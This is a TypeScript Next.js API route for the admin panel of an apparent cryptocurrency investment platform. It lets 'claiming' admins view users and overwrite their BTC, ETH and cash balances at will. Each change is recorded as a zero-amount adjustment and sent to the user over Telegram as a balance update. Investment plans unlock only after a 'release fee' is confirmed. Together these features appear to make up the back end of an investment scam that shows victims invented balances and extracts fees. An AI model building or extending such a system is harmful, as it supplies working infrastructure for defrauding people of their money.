import { NextRequest, NextResponse } from "next/server";
import { sql } from "@/lib/db";
import { getAdminIdentity } from "@/lib/auth";
import { sendTelegramMessage } from "@/lib/telegram";

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
  const identity = await getAdminIdentity();
  if (!identity.isAdmin) {
    return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
  }

  const userId = Number(params.id);
  if (!userId) {
    return NextResponse.json({ error: "Invalid user id" }, { status: 400 });
  }

  const userRows = await sql`
    SELECT id, telegram_id, first_name, last_name, username, phone, avatar_url, is_active, is_admin, release_paid,
           assigned_admin_id, support_contact, btc_address, eth_address, created_at
    FROM users WHERE id = ${userId}
  `;
  if (userRows.length === 0) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }

  const target = userRows[0];
  if (!identity.isSuperAdmin && target.assigned_admin_id !== identity.userId) {
    return NextResponse.json({ error: "You have not claimed this user" }, { status: 403 });
  }

  const [balanceRows, transactionRows, investmentRows, withdrawalRows] = await Promise.all([
    sql`SELECT btc_amount, eth_amount, usd_cash, updated_at FROM balances WHERE user_id = ${userId}`,
    sql`SELECT id, type, amount, currency, status, note, created_at FROM transactions WHERE user_id = ${userId} ORDER BY created_at DESC LIMIT 50`,
    sql`
      SELECT i.id, i.amount, i.currency, i.status, i.started_at, i.matures_at, p.name AS plan_name
      FROM investments i JOIN investment_plans p ON p.id = i.plan_id
      WHERE i.user_id = ${userId} ORDER BY i.started_at DESC
    `,
    sql`SELECT id, amount, currency, wallet_address, status, admin_note, created_at FROM withdrawal_requests WHERE user_id = ${userId} ORDER BY created_at DESC`,
  ]);

  return NextResponse.json({
    user: target,
    balance: balanceRows[0] ?? { btc_amount: "0", eth_amount: "0", usd_cash: "0" },
    transactions: transactionRows,
    investments: investmentRows,
    withdrawals: withdrawalRows,
  });
}

export async function PATCH(req: NextRequest, { params }: { params: { id: string } }) {
  const identity = await getAdminIdentity();
  if (!identity.isAdmin) {
    return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
  }

  const userId = Number(params.id);
  if (!userId) {
    return NextResponse.json({ error: "Invalid user id" }, { status: 400 });
  }

  const ownerCheck = await sql`SELECT assigned_admin_id FROM users WHERE id = ${userId}`;
  if (ownerCheck.length === 0) {
    return NextResponse.json({ error: "User not found" }, { status: 404 });
  }
  if (!identity.isSuperAdmin && ownerCheck[0].assigned_admin_id !== identity.userId) {
    return NextResponse.json({ error: "You have not claimed this user" }, { status: 403 });
  }

  const body = await req.json();
  const {
    firstName,
    lastName,
    phone,
    isActive,
    isAdmin: makeAdmin,
    releasePaid,
    supportContact,
    btcAddress,
    ethAddress,
    btcAmount,
    ethAmount,
    usdCash,
    note,
  } = body;

  const notifications: string[] = [];

  if (
    firstName !== undefined ||
    lastName !== undefined ||
    phone !== undefined ||
    isActive !== undefined ||
    makeAdmin !== undefined ||
    releasePaid !== undefined ||
    supportContact !== undefined ||
    btcAddress !== undefined ||
    ethAddress !== undefined
  ) {
    await sql`
      UPDATE users SET
        first_name = COALESCE(${firstName ?? null}, first_name),
        last_name = COALESCE(${lastName ?? null}, last_name),
        phone = COALESCE(${phone ?? null}, phone),
        is_active = COALESCE(${isActive ?? null}, is_active),
        is_admin = COALESCE(${makeAdmin ?? null}, is_admin),
        release_paid = COALESCE(${releasePaid ?? null}, release_paid),
        support_contact = CASE WHEN ${supportContact !== undefined} THEN ${supportContact ?? null} ELSE support_contact END,
        btc_address = CASE WHEN ${btcAddress !== undefined} THEN ${btcAddress ?? null} ELSE btc_address END,
        eth_address = CASE WHEN ${ethAddress !== undefined} THEN ${ethAddress ?? null} ELSE eth_address END
      WHERE id = ${userId}
    `;

    if (isActive !== undefined) {
      notifications.push(isActive ? "Your account has been reactivated." : "Your account has been deactivated.");
    }
    if (makeAdmin === true) {
      notifications.push("You have been granted admin access to the wallet.");
    }
    if (releasePaid === true) {
      notifications.push("Your release fee has been confirmed. Investment plans are now unlocked.");
    }
  }

  if (btcAmount !== undefined || ethAmount !== undefined || usdCash !== undefined) {
    const existing = await sql`SELECT id, btc_amount, eth_amount, usd_cash FROM balances WHERE user_id = ${userId}`;

    const newBtc = btcAmount !== undefined ? Number(btcAmount) : Number(existing[0]?.btc_amount ?? 0);
    const newEth = ethAmount !== undefined ? Number(ethAmount) : Number(existing[0]?.eth_amount ?? 0);
    const newUsd = usdCash !== undefined ? Number(usdCash) : Number(existing[0]?.usd_cash ?? 0);

    if (existing.length === 0) {
      await sql`INSERT INTO balances (user_id, btc_amount, eth_amount, usd_cash) VALUES (${userId}, ${newBtc}, ${newEth}, ${newUsd})`;
    } else {
      await sql`UPDATE balances SET btc_amount = ${newBtc}, eth_amount = ${newEth}, usd_cash = ${newUsd}, updated_at = NOW() WHERE user_id = ${userId}`;
    }

    await sql`
      INSERT INTO transactions (user_id, type, amount, currency, status, note)
      VALUES (${userId}, 'adjustment', 0, 'USD', 'completed', ${note || "Balance adjusted by admin"})
    `;

    notifications.push(
      `Your balance was updated: ${newBtc} BTC, ${newEth} ETH, $${newUsd} cash.${note ? ` Note: ${note}` : ""}`
    );
  } else if (note) {
    await sql`
      INSERT INTO transactions (user_id, type, amount, currency, status, note)
      VALUES (${userId}, 'adjustment', 0, 'USD', 'completed', ${note})
    `;
    notifications.push(`A note was added to your account: ${note}`);
  }

  if (notifications.length > 0) {
    const userRows = await sql`SELECT telegram_id FROM users WHERE id = ${userId}`;
    const telegramId = userRows[0]?.telegram_id;
    if (telegramId) {
      await sendTelegramMessage(telegramId, notifications.join("\n\n"));
    }
  }

  return NextResponse.json({ success: true });
}
